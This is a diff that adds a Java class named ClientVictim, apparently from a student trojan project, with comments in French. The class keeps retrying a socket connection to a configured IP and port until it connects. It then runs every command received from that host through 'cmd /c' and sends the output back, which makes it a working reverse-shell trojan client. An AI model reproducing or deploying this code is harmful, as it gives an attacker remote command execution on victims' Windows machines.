@@ -1,0 +1,174 @@
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
+import java.net.Socket;
+import java.net.UnknownHostException;
+import java.sql.Date;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.GregorianCalendar;
+
+
+public class ClientVictim extends Thread implements IUtilisateurDEcouteur{
+	
+	private String ip;
+	private int port;
+	private Socket socket;
+	//private File logFile;
+	//private PrintWriter BufferDEcritureLog;
+	//String date = new SimpleDateFormat("dd-MM-YY").format(new java.util.Date());
+	private PrintWriter BufferDEnvoie;
+	private EcouteurMessage EcouteurMessage;
+	
+	
+	public ClientVictim(String IP, int PORT) {
+		this.ip = IP;
+		this.port = PORT;
+		
+		//this.logFile = new File("C:\\Users\\rben-hmidane\\Desktop\\logProjTroj.txt");
+		try {
+			
+			//this.BufferDEcritureLog = new PrintWriter(new FileWriter(this.logFile), true);
+			//this.connexion();
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
+		
+		
+	}
+	
+	
+	public void run() {
+		
+		System.out.println("Nouvelle connexion\n\n");
+		
+		/*while(true) {
+			
+			this.connexion();
+			try {
+				this.sleep(5000);
+			} catch (InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}*/
+		this.connexion();
+		
+	}
+	
+	public Socket getSocket() {
+		return this.socket;
+	}
+	
+	public void connexion() {
+		boolean connection = false;
+		
+		while(connection == false){
+			try {
+				
+				this.socket = new Socket(this.ip, this.port);
+				//this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] INFO : Connexion Réussie");
+				//this.BufferDEcritureLog.flush();
+				this.BufferDEnvoie = new PrintWriter(this.socket.getOutputStream());
+				this.EcouteurMessage = new EcouteurMessage(this);
+				this.EcouteurMessage.start();
+				connection = true;
+				System.out.println("ConnexionRéussie");
+			} catch (Exception e) {
+				//this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] ERROR : Connexion échouée !");
+				// TODO Auto-generated catch block
+				//this.BufferDEcritureLog.flush();
+				//e.printStackTrace();
+				System.out.println("Connexion Echouée");
+			}
+			
+			if(connection == false) {
+				try {
+					this.sleep(5000);
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		}
+		System.out.println("Fin d'essaie connexion");
+	}
+	
+	public void Disconnection() {
+		this.BufferDEnvoie.close();
+		this.EcouteurMessage.close();
+		try {
+			
+			
+			this.socket.close();
+			//this.EcrireNotificationLogINFO("Fermeture de la connexion");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
+		
+	}
+	
+	/*public void EcrireNotificationLogINFO(String message) {
+	
+		this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] INFO : "+message);
+		this.BufferDEcritureLog.flush();
+		
+	}
+	
+	public void EcrireNotificationLogERROR(String message) {
+		
+		this.BufferDEcritureLog.println("("+date+") ["+new SimpleDateFormat("HH:mm:ss").format(new java.util.Date())+"] ERROR : "+message);
+		this.BufferDEcritureLog.flush();
+		
+	}*/
+	
+	public void TraitementMessage(String message) {
+		this.EnvoieMessage(message);
+		this.EnvoieMessage(this.AppelsSysteme(message));
+		//System.out.println("Message reçu : "+message);
+	}
+	
+	public String AppelsSysteme(String message) {
+		String resultFinal = "";
+		try {
+			Process p = Runtime.getRuntime().exec("cmd /c "+message);
+			BufferedReader buffer = new BufferedReader(new InputStreamReader(p.getInputStream(), "cp850"));
+			//BufferedReader buffer = new BufferedReader(new InputStreamReader(p.getInputStream()));
+			
+			String tmp;
+			
+			while((tmp = buffer.readLine()) != null) {
+				//System.setProperty("file.encoding", "cp850");
+				resultFinal += tmp+"\n";
+			}
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return resultFinal;
+	}
+	
+	public void EnvoieMessage(String message) {
+	
+		
+			this.BufferDEnvoie.println(message);
+			
+			this.BufferDEnvoie.flush();
+	}
+	
+	
+	
+	
+	
+}
